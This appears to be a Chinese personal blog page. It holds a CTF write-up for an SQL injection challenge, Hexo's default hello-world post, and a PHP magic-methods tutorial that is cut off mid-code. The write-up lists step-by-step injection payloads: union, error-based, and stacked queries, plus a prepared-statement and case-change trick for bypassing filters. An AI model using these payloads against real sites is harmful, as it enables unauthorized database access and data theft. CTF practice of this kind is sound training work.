<!DOCTYPE html>
<html lang="zh-CN">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="Qhkk" />


    
    


<meta property="og:type" content="website">
<meta property="og:title" content="Qhkk&#39;s blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Qhkk&#39;s blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Qhkk">
<meta name="twitter:card" content="summary">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="Qhkk&#39;s blog" type="application/atom+xml">



    <link rel="shortcut icon" href="/favicon.png">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">



<link rel="stylesheet" href="/css/style.css">



    <style> .article { opacity: 0;} </style>


<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>Qhkk&#39;s blog</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: true,
        isPost: false,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: 
    }
</script>


    <script> yiliaConfig.jquery_ui = [false]; </script>



    <script> yiliaConfig.rootUrl = "\/";</script>






<meta name="generator" content="Hexo 6.1.0"></head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/avatar.png" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/"></a></h1>
        </hgroup>

        

        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
                            
                                <a class="fa GitHub" href="#" title="GitHub"></a>
                            
                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="tag">ctf刷题记录</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
                    
                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
                    
                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">专注于前端</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/avatar.png" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
                            
                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
                            
                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
</nav>
      <div class="body-wrap">
  
    <article id="post-buu-web-page-1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/05/22/buu-web-page-1/" class="article-date">
      <time datetime="2022-05-21T16:00:00.000Z" itemprop="datePublished">2022-05-22</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/05/22/buu-web-page-1/">buu web page-1</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><h2 id="字段判断"><a href="#字段判断" class="headerlink" title="字段判断"></a>字段判断</h2><h3 id="字段数"><a href="#字段数" class="headerlink" title="字段数"></a>字段数</h3><p>输入数字查询，直到3的时候无回显，字段数应该为2</p>
<p><img src="/2022/05/22/buu-web-page-1/image-20220522112103558.png" alt="image-20220522112103558"></p>
<h3 id="字段回显"><a href="#字段回显" class="headerlink" title="字段回显"></a>字段回显</h3><p>直到字段数，直接联合注入，查看回显，构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&#x27; union select 1,2 --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/22/buu-web-page-1/image-20220522112947010.png" alt="image-20220522112947010"></p>
<p>发现好多关键字被过滤掉了，所以不能走select这条路子了，我们还有报错注入，堆叠注入</p>
<h2 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>考虑到select被过滤，现在也就只有两种报错盲注能用</p>
<p>第一种，构建payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&#x27; or updatexml(1,concat(0x7e,(database())),0) or#</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/22/buu-web-page-1/image-20220522113136880.png" alt="image-20220522113136880"></p>
<p>emmm，又被过滤掉了，那接着试试第二种，构建payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&#x27; or extractvalue(1,concat(0x7e,(database())),0) or#</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/22/buu-web-page-1/image-20220522113212844.png" alt="image-20220522113212844"></p>
<p>好嘛，又被过滤掉了，只能用堆叠注入了</p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>堆叠注入利用分号(;)一下子能执行多条语句，先看看数据库有啥，构建payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=-1&#x27;; show databases;# </span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/22/buu-web-page-1/image-20220522113512552.png" alt="image-20220522113512552"></p>
<p>爆了好多数据库，排除几个常见的数据库，接着一个个看一下表，构建payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=-1&#x27;;use ctftraining;show tables;# </span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/22/buu-web-page-1/image-20220522113604450.png" alt="image-20220522113604450"></p>
<p>欸？flag_table，看一下有什么字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=-1&#x27;;use ctftraining;show columns from FLAG_TABLE;# </span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/22/buu-web-page-1/image-20220522113716808.png" alt="image-20220522113716808"></p>
<p>行叭行叭，看看其他的数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=-1&#x27;;use supersqli;show tables;#</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/22/buu-web-page-1/image-20220522113937365.png" alt="image-20220522113937365"></p>
<p> 看一下第一个纯数字的表，注意纯数字的表名得用&#96;&#96;包裹，构建payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=-1&#x27;;use supersqli;show columns from `1919810931114514`;# </span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/22/buu-web-page-1/image-20220522114206785.png" alt="image-20220522114206785"></p>
<p>好了，知道flag在哪里了，如何查询？</p>
<h2 id="字段查询"><a href="#字段查询" class="headerlink" title="字段查询"></a>字段查询</h2><p>预编译绕过法</p>
<p>预编译就是先set（定义）一个变量@a，然后prepare（准备）一个b从@a那获得，然后execute（执行） b，也就是变相地执行了@a的语句</p>
<p><img src="/2022/05/22/buu-web-page-1/image-20220522114622569.png" alt="image-20220522114622569"></p>
<p>也可以通过concat函数联合@a里的内容来绕过过滤</p>
<p><img src="/2022/05/22/buu-web-page-1/image-20220522114844538.png" alt="image-20220522114844538"></p>
<p>利用预编译绕过select 就能直接拿到flag了，构建payload</p>
<pre><code>?inject=-1&#39;;set @sql = concat(&#39;sele&#39;,&#39;ct flag from `1919810931114514`;&#39;);prepare stmt from @sql;execute stmt;#
</code></pre>
<p><img src="/2022/05/22/buu-web-page-1/image-20220522115538081.png" alt="image-20220522115538081"></p>
<p>可以看到set跟prepare被strstr函数给检测出来了，但是strstr函数不区分大小写，所以我们可以用大小写法绕过，把set改成SeT，prepare改成PrePare</p>
<p><img src="/2022/05/22/buu-web-page-1/image-20220522115614916.png" alt="image-20220522115614916"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="tag">ctf刷题记录</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/05/06/hello-world/" class="article-date">
      <time datetime="2022-05-06T06:27:03.308Z" itemprop="datePublished">2022-05-06</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/05/06/hello-world/">Hello World</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-PHP魔术方法理解" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/05/05/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%90%86%E8%A7%A3/" class="article-date">
      <time datetime="2022-05-04T16:00:00.000Z" itemprop="datePublished">2022-05-05</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/05/05/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%90%86%E8%A7%A3/">PHP魔术方法理解</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>__construct()</p>
<p>当实例化一个类时，自动触发</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">person</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;yanyan&quot;</span>;</span><br><span class="line">      <span class="keyword">public</span> <span class="variable">$sex</span> = <span class="string">&quot;woman&quot;</span>;</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">public</span> <span class="title function_ invoke__">function__construct</span>()</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&quot;xiaobai&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex=<span class="string">&quot;man&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">intro</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;打印结果如下：\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$name:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;name\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$sex:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;sex\n&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">person</span>();</span><br><span class="line"><span class="variable">$person1</span>-&gt;<span class="title function_ invoke__">intro</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/05/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%90%86%E8%A7%A3/1650957143971-283c87e2-ecd3-44eb-ac90-e93d9ff2352a.png" alt="img"></p>
<p>__destruct()</p>
<p>销毁一个类时自动触发</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">person</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;yanyan&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$sex</span>=<span class="string">&quot;woman&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;1.__construct()方法已执行！&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$name,$nsex已重置为新值&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;name=<span class="string">&quot;xiaobai&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;sex=<span class="string">&quot;man&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">intro</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&#x27;2.__intro方法已执行&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;打印结果如下：\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&#x27;$name:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;name\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&#x27;$sex:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;sex\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;name=<span class="string">&quot;sisi&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;age=<span class="string">&quot;woman&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&#x27;3.__destruct()方法已执行&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$name,$sex已重置为默认值.&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&#x27;$name:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;name\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&#x27;$sex:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;sex\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">person</span>();</span><br><span class="line"><span class="variable">$person1</span>-&gt;<span class="title function_ invoke__">intro</span>();</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/05/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%90%86%E8%A7%A3/1650957970415-9a0c4682-5e4b-4f57-b9a8-64fff03d84d2.png" alt="img"></p>
<p>__sleep()</p>
<p>执行serialize()前如果存在__sleep()方法，触发</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;yanyan&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>=<span class="string">&quot;woman&quot;</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">intro</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;1、__intro方法已执行&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;打印结果如下:\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$name:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;name\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$sex:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;sex\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;2、__sleep()方法已执行！&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$name,$sex已重置为新值.&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&quot;xiaobai&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex=<span class="string">&quot;man&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$name:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;name\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$sex:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;sex\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">person</span>();</span><br><span class="line"><span class="variable">$person1</span>-&gt;<span class="title function_ invoke__">intro</span>();  </span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/05/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%90%86%E8%A7%A3/1650958821893-4717c4d0-1576-4f36-9199-d31052d454ef.png" alt="img"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;yanyan&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>=<span class="string">&quot;woman&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">intro</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;1、__intro方法已执行&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;打印结果如下:\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$name:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;name\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$sex:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;sex\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;2、__sleep()方法已执行！&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$name,$sex已重置为新值.&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&quot;xiaobai&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex=<span class="string">&quot;man&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$name:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;name\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$sex:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;sex\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span 